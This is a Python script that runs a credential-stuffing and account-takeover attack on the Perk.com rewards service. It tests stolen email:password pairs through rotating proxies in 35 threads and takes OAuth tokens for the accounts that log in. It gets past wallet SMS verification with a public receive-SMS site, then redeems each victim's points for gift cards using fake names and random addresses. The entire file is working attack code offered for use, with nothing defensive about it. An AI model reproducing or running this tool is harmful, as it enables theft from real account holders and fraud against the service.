import requests
import re
import Queue
import random
import time
import codecs
from threading import Thread

requests.packages.urllib3.disable_warnings()

with codecs.open('code.txt', 'r', encoding='utf-8') as f:
	lcode = f.read()
with codecs.open('Proxies Working.txt', 'r', encoding='utf-8') as f:
	proxies = f.readlines()
	

t = 0
def gett():
	global t
	return t
	
def addt(s):
	global t
	t += s
	
def check(q):
	global t
	s = requests.session()
	while True:
		c = q.get()
		user = c.split(':')[0]
		passw = c.split(':')[1]
		print 'Redeeming from', user
		er = True
		proxy = random.choice(proxies).strip()
		while er:
			s.cookies.clear()
			try:
				#proxy = '127.0.0.1:8888'
				prozy = {
					'http': proxy,
					'https': proxy
				}
				works = False
				headers = {
					'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2810.2 Safari/537.36',
					'Accept-Encoding': 'gzip, deflate, br',
					'Accept': 'application/json, text/plain, */*',
					'Accept-Language': 'en-US,en;q=0.8',
					'Referer': 'http://perk.com/home/',
				}
				r = s.get(
					'https://auth.perk.com/oauth?client_id=perk_web&redirect_uri=https%3A%2F%2Fv2.perk.com%2Fauthentication%2Foauth2%2Fcallback&product_identifier=web_browser&client_name=Perk.com&response_type=code&state=login',
					verify=False,
					proxies=prozy,
					timeout=16,
					headers=headers
				)
				headers['Content-Type'] = 'application/json;charset=UTF-8'
				headers['Referer'] = 'https://auth.perk.com/login'
				headers['X-XSRF-TOKEN'] = s.cookies.get_dict()['XSRF-TOKEN']
				r = s.post(
					'https://auth.perk.com/signin',
					json={"email":user,"password":passw,"signin":True},
					verify=False,
					proxies=prozy,
					timeout=16,
					headers=headers
				)
				v = False
				if 'The email or password' in r.text:
					print user, 'does not work!'
					works = True
				elif 'status":"success' in r.text:
					works = True
					r = s.post(
								'https://auth.perk.com/authorize',
								json={"authorization":"Approve"},
								verify=False,
								proxies=prozy,
								timeout=16,
								headers=headers
							)
					ac = re.findall('callback\?code=(.*?)&', r.text)[0]
					r = s.get(
								'https://web-api.perk.com/v1/authentication/authorize?code={0}&client_identifier=perk_web&grant_type=authorization_code&product_identifier=web_browser&redirect_uri=https:%2F%2Fv2.perk.com%2Fauthentication%2Foauth2%2Fcallback'.format(ac),
								verify=False,
								proxies=prozy,
								timeout=16,
								headers=headers
							)
					ac = re.findall('access_token":"(.*?)"', r.text)[0]
					r = s.get(
								'https://api-v2.perk.com/v2/users/{0}.json?includes[]=address'.format(ac),
								verify=False,
								proxies=prozy,
								timeout=16,
								headers=headers
							)
					points = re.findall('available_perks":(.*?),', r.text)[0]
					
					r = s.get(
								'https://api-v2.perk.com/wallet/v2/info.json?access_token={0}'.format(ac),
								verify=False,
								proxies=prozy,
								timeout=16,
								headers=headers
							)
					while 'is_verified":true' not in r.text:
						r = s.get(
									'https://api-v2.perk.com/wallet/v2/codes.json?access_token={0}&mode=sms&country_code=%2B1&phone=2045152665'.format(ac),
									verify=False,
									proxies=prozy,
									timeout=16,
									headers=headers
								)
						headers['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8'
						r = requests.post(
									'https://receive-a-sms.com/employee-grid-dataCANADA1.php',
									'draw=1&columns%5B0%5D%5Bdata%5D=0&columns%5B0%5D%5Bname%5D=&columns%5B0%5D%5Bsearchable%5D=true&columns%5B0%5D%5Borderable%5D=true&columns%5B0%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B0%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B1%5D%5Bdata%5D=1&columns%5B1%5D%5Bname%5D=&columns%5B1%5D%5Bsearchable%5D=true&columns%5B1%5D%5Borderable%5D=true&columns%5B1%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B1%5D%5Bsearch%5D%5Bregex%5D=false&columns%5B2%5D%5Bdata%5D=2&columns%5B2%5D%5Bname%5D=&columns%5B2%5D%5Bsearchable%5D=true&columns%5B2%5D%5Borderable%5D=true&columns%5B2%5D%5Bsearch%5D%5Bvalue%5D=&columns%5B2%5D%5Bsearch%5D%5Bregex%5D=false&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc&start=0&length=10&search%5Bvalue%5D=&search%5Bregex%5D=false',
									proxies=prozy,
									verify=False,
									headers=headers
								)
								
						code = re.findall('Your Perk account verification code is  (.*?)"', r.text)[0]
						
						if code not in lcode:
							f = open("code.txt", "w")
							f.write(code)
							f.close()
							headers['Content-Type'] = 'application/json;charset=UTF-8'
							r = s.post(
										'https://api-v2.perk.com/wallet/v2/verify.json',
										json={
										"access_token":ac,
										"number":"+12045152665",
										"code":code
										},
										verify=False,
										proxies=prozy,
										timeout=16,
										headers=headers
									)
									
						r = s.get(
									'https://api-v2.perk.com/wallet/v2/info.json?access_token={0}'.format(ac),
									verify=False,
									proxies=prozy,
									timeout=16,
									headers=headers
								)
					while int(points) >= 350:
						if int(points) >= 100000:
							uuid = 'b41dff12-a834-4535-ab8d-a7f9148324f5'
							amt = '$100'
							addt(100)
						elif int(points) >= 50000:
							uuid = '1ad0abf4-ede4-46f3-ac7b-571bd03d461c'
							amt = '$50'
							addt(50)
						elif int(points) >= 25000:
							uuid = '7dea98b2-8dd0-4cfb-a151-05fc684f7bd2'
							amt = '$25'
							addt(25)
						elif int(points) >= 20000:
							uuid = '8191a69d-a56c-4068-8165-36da4f53f175'
							amt = '$20'
							addt(20)
						elif int(points) >= 10000:
							uuid = '06ff4077-b2ce-495b-b701-b8e312178bb8'
							amt = '$10'
							addt(10)
						elif int(points) >= 5000:
							uuid = '3ec77276-fd45-4989-91a7-55ee34fbbe76'
							amt = '$5'
							addt(5)
						elif int(points) >= 2500:
							uuid = 'b90359bc-d697-4f4f-82d1-23bdba452793'
							amt = '$2.50'
							addt(2.50)
						elif int(points) >= 1250:
							uuid = 'e67bf7b4-7e4b-47dc-a023-7330fe0d1ce3'
							amt = '$1'
							addt(1)
						elif int(points) >= 650:
							uuid = '51082455-d149-4a52-b337-cd3feb74a60f'
							amt = '$0.50'
							addt(0.5)
						elif int(points) >= 350:
							uuid = 'bf0c74ec-6e80-4ccd-83e0-3df8dc8646db'
							amt = '$0.25'
							addt(0.25)
					
						headers['Device-Info'] = 'app_name=Perk Web;app_version=d66e5fa;app_bundle_id=com.perk;product_identifier=web_browser;os_name=Windows;os_version=10;device_model=Chrome 54.0.2810.2;device_manufacturer=Windows;device_resolution=1920x1080;desktop_id=3fe6d357-6151-4ee3-8a08-4c14bc092d61;'
						headers['Content-Type'] = 'application/json;charset=UTF-8'
						headers['Referer'] = 'https://v2.perk.com/rewards/detail/' + uuid
						
						r = s.post(
									'https://api-v2.perk.com/wallet/v2/redemptions.json',
									json={
										"access_token":ac,
										"reward_uuid":uuid,
										"first_name":user.split("@")[0],
										"last_name":user.split("@")[0],
										"phone":"12045152665",
										"email":"{0}@dispostable.com".format(user.split("@")[0]),
										"address":"{0} {1} {2}".format(random.randint(100, 9999), random.choice(['North', "South", 'East', 'West']), random.choice(['Street', 'St'])),
										"address2":"",
										"city":"Sacramento",
										"state":"CA",
										"country":"US",
										"zip":94203 + random.randint(0, 73)
									},
									verify=False,
									proxies=prozy,
									timeout=16,
									headers=headers
								)
						if 'us":"succe' in r.text:
							print 'Redeemed', amt
							print 'Total so far:', gett()
						points = re.findall('updated_points":(.*?)}', r.text)[0]
					return
				
				if not 'An error has occurred. ' in r.text:
					time.sleep(1)
					er = False
					
			except Exception, e:
				print e
				proxy = random.choice(proxies).strip()
	
def main():
	with codecs.open('points.txt', 'r', encoding='utf-8') as f:
		users = f.readlines()
	with codecs.open('checked.txt', 'r', encoding='utf-8') as f:
		checked = f.read()
		
	queue = Queue.Queue()
	
	for _ in range(int(35)):
		worker = Thread(target=check, args=(queue,))
		worker.start()
	for user in users:
		if not user.strip().encode('ascii', 'ignore').split(':')[0] in checked:
			queue.put(user.strip().encode('ascii', 'ignore'))
			
if __name__ == '__main__':
	main()